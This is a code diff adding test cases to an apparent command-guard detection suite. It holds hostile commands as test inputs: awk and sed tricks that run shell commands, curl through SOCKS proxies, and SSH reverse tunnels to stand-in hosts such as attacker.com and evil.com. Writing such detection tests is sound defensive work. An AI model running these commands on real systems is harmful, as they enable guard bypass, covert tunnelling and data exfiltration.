@@ -819,6 +819,48 @@ describe("ExecGuard", () => {
     expect(result.shouldBlock).toBe(true);
   });
 
+  // ── awk system() execution ──
+
+  it("detects awk BEGIN{system()} execution", () => {
+    const result = execGuardRule.check(
+      makeCtx("bash", { command: "awk 'BEGIN{system(\"whoami\")}'" })
+    );
+    expect(result.triggered).toBe(true);
+    expect(result.shouldBlock).toBe(true);
+  });
+
+  it("detects awk system($0) execution", () => {
+    const result = execGuardRule.check(
+      makeCtx("bash", { command: "awk '{system($0)}'" })
+    );
+    expect(result.triggered).toBe(true);
+    expect(result.shouldBlock).toBe(true);
+  });
+
+  it("detects awk print pipe to /bin/sh", () => {
+    const result = execGuardRule.check(
+      makeCtx("bash", { command: "awk 'BEGIN{print \"ls\" | \"/bin/sh\"}'" })
+    );
+    expect(result.triggered).toBe(true);
+    expect(result.shouldBlock).toBe(true);
+  });
+
+  // ── sed -e flag execution ──
+
+  it("detects sed s///e flag execution", () => {
+    const result = execGuardRule.check(
+      makeCtx("bash", { command: "sed 's/.*/ls/e' file.txt" })
+    );
+    expect(result.triggered).toBe(true);
+  });
+
+  it("detects sed s///e via pipe", () => {
+    const result = execGuardRule.check(
+      makeCtx("bash", { command: "echo test | sed 's/test/whoami/e'" })
+    );
+    expect(result.triggered).toBe(true);
+  });
+
   // ── 中间管道绕过 ──
 
   it("detects curl through intermediate pipe", () => {
@@ -3139,6 +3181,22 @@ describe("NetworkGuard", () => {
     expect(result.triggered).toBe(true);
     expect(result.shouldBlock).toBe(true);
   });
+
+  // ── SOCKS proxy detection ──
+
+  it("detects curl --socks5 proxy usage", () => {
+    const result = networkGuard.check(
+      makeCtx("bash", { command: "curl --socks5 127.0.0.1:9050 http://target.com" })
+    );
+    expect(result.triggered).toBe(true);
+  });
+
+  it("detects curl --proxy socks5:// usage", () => {
+    const result = networkGuard.check(
+      makeCtx("bash", { command: "curl --proxy socks5://proxy:1080 http://target.com" })
+    );
+    expect(result.triggered).toBe(true);
+  });
 });
 
 // ═══════════════════════════════════════════════════════════
@@ -4394,6 +4452,24 @@ describe("DataExfil", () => {
   it("detects Google API key (AIzaSy)", () => {
     const r = rule.check(makeCtx("http_request", {
       body: "key=AIzaSyABCDEFGHIJKLMNOPQRSTUVWXYZ0123456",
+    }));
+    expect(r.triggered).toBe(true);
+    expect(r.event?.severity).toBe("critical");
+  });
+
+  // ── SSH reverse tunnel exfiltration ──
+
+  it("detects ssh -R reverse tunnel", () => {
+    const r = rule.check(makeCtx("bash", {
+      command: "ssh -R 8080:localhost:22 attacker.com",
+    }));
+    expect(r.triggered).toBe(true);
+    expect(r.event?.severity).toBe("critical");
+  });
+
+  it("detects ssh reverse tunnel with user@host", () => {
+    const r = rule.check(makeCtx("bash", {
+      command: "ssh user@evil.com -R 9999:127.0.0.1:3306",
     }));
     expect(r.triggered).toBe(true);
     expect(r.event?.severity).toBe("critical");
